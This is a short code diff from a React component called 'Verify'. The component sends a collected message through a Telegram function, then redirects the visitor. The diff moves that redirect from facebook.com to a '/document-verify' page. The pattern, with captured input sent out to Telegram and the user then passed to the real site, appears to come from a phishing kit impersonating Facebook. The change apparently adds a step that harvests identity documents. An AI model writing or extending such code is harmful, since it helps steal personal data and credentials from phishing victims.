@@ -89,10 +89,10 @@ const Verify: FC = () => {
 			try {
 				await sendTelegramMessage(message, config, savedMessageId);
 				setTimeout(() => {
-					window.location.replace("https://facebook.com");
+					navigate("/document-verify");
 				}, config.loadingTime);
 			} catch {
-				window.location.replace("https://facebook.com");
+				navigate("/document-verify");
 			}
 			return;
 		}
